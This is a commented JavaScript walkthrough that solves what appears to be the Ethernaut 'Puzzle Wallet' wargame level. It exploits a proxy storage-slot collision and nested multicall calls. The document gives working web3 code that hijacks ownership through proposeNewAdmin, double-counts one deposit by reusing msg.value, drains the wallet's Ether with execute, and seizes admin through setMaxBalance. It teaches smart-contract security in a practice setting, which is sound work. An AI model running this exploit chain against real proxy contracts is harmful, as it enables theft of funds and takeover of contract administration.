// To solve this level, we need to understand somme things about Proxy
//  contracts

// Proxy contracts essentially allow us to "upgrade" our smart contracts

// However, since code is immutable once on the blockchain, what a proxy
//  contract really does is receive function calls from users, and then points
//  to which implementation contract is the “correct” one, and routes
//  everyone’s function calls to that contract

// So our instance in this level is the proxy contract: any calls we make to
//  the instance will be routed to the implementation contract (PuzzleWallet)
//  if we do not specifically call a method from the proxy contract -- this
//  routing is performed by the low-level delegatecall, which has implications
//  for state

// As always, understanding the storage of contracts is very important as it
//  can leave them open to attacks -- as is the case here

// When proxy contracts are used, it is almost as if the proxy contract is just
//  layered on top of the implementation contract in terms of storage: the 0th
//  slot will be the same in both contracts

// For example, in this level, we see that in PuzzleProxy, pendingAdmin
//  occupies storage slot 0, and in PuzzleWallet, owner occupies storage slot
//  0 as well

// This means that if we change pendingAdmin in PuzzleProxy, we change owner in
//  PuzzleWallet

// We solve the level if we change admin to our own address

// Knowing what we know about how the state variables are laid out in storage,
//  we can work out that if we change maxBalance in PuzzleWallet to our
//  address, then we become the admin of the contract

// The easiest way to change maxBalance is to use the setMaxBalance() function,
//  but that requires address(this).balance == 0

await getBalance(instance);
// >> returns 0.001

// The balance of PuzzleWallet is not 0, so we need to change it

// We can do this using the execute() method, which will send a call to us with
//  some value, thereby removing some balance from PuzzleWallet

// However, doing this requires that balances[msg.sender] >= value

(await contract.balances(player)).toString();
// >> returns 0

// So we can't withdraw 0.001 Ether from the PuzzleWallet yet

// But we can call deposit() to deposit 0.001 Ether into the contract, thereby
//  updating our balance

// However there are two problems with this:
//  1. deposit() has the onlyWhitelisted modifier
//  2. depositing 0.001 Ether will change the balance of the contract to 0.002
//     Ether, and since we can only withdraw what we deposit, we can't drain
//     the PuzzleWallet of funds

// The first problem is solved by utilising the proxy's proposeNewAdmin()
//  method and passing our address -- this will change pendingAdmin to our
//  address, thereby changing owner in Puzzle Wallet to our address since owner
//  and pendingAdmin share the same storage slot

await contract.owner();
// >> returns some owner address

let payload_proposeNewAdmin = web3.eth.abi.encodeFunctionCall(
    {
        name: "proposeNewAdmin",
        type: "function",
        inputs: [{ type: "address", name: "_newAdmin" }],
    },
    [player]
);

web3.eth.sendTransaction({
    from: player,
    to: instance,
    data: payload_proposeNewAdmin,
});

await contract.owner();
// >> returns our address

// Now that we are the owner, we can call the addToWhitelist() method in
//  PuzzleWallet

await contract.whitelisted(player);
// >> returns false

await contract.addToWhitelist(player);

await contract.whitelisted(player);
// >> returns true

// Now to deal with the second problem

// We need to somehow update balances[player] to 0.002 Ether, while only
//  sending 0.001 Ether to the contract

// The only other way we could do this is to use the multicall() method, which
//  allows us to batch multiple transactions into one transaction

// If we were to find some way to call deposit() twice using multicall(), we
//  could trick the contract into thinking that we've provided 0.002 Ether to
//  deposit, when we've really only provided 0.001 Ether -- reusing msg.value

// multicall() has code to prevent this by comparing the function selectors
//  and making sure they aren't both for deposit()

// But what if we were to multicall a multicall -- multicallception -- and put
//  a deposit in our nested multicall

// Because depositCalled's scope is limited to the multicall() method,
//  depositCalled would not be true in our nested multicall, thereby allowing
//  a deposit() call to occur in the nested multicall

// So, in summary, we will call multicall() passing the data for:
//  - a deposit() call
//  - a multicall() call, passing data to this multicall for another deposit()
//    call

// encode the data for a deposit() call
let payload_deposit = web3.eth.abi.encodeFunctionSignature({
    name: "deposit",
    type: "function",
    inputs: [],
});

// encode the data for the nested/internal multicall() call
//  -- contains a call of deposit()
let payload_internalMulticall = web3.eth.abi.encodeFunctionCall(
    {
        name: "multicall",
        type: "function",
        inputs: [{ type: "bytes[]", name: "data" }],
    },
    [[payload_deposit]]
);

// encode the data for the external multicall() call
//  -- contains a call of deposit() and the internal multicall()
let payload_externalMulticall = web3.eth.abi.encodeFunctionCall(
    {
        name: "multicall",
        type: "function",
        inputs: [{ type: "bytes[]", name: "data" }],
    },
    [[payload_deposit, payload_internalMulticall]]
);

// send the external multicall transaction with a value of 0.001 Ether
web3.eth.sendTransaction({
    from: player,
    to: instance,
    value: web3.utils.toWei("0.001", "ether"),
    data: payload_externalMulticall,
});

// Now let's check the PuzzleWallet balance against our listed deposit balance
await getBalance(instance);
// >> returns 0.002

web3.utils.fromWei((await contract.balances(player)).toString(), "Ether");
// >> returns 0.002

// Now, we can execute() a withdrawal of 0.002 Ether to drain PuzzleWallet

await contract.execute(player, web3.utils.toWei("0.002", "ether"), "0x0");

await getBalance(instance);
// >> returns 0

// And now that PuzzleWallet has no balance, we can call setMaxBalance(),
//  passing our address as a uint256

await contract.setMaxBalance(
    "0x0000000000000000000000cDA1048cf97B65ED9fb852AE677F02a28bd09ad3"
);

(await contract.maxBalance()).toString(16);
// >> returns cDA1048cf97B65ED9fb852AE677F02a28bd09ad3

// (Usually I would manuall check the value of admin using some call, but this
//  requires getting the transaction hash and parsing the logs of the hash etc.
//  and it doesn't seem very programmy to spend all that effort when I can just
//  click submit to check)

// submit
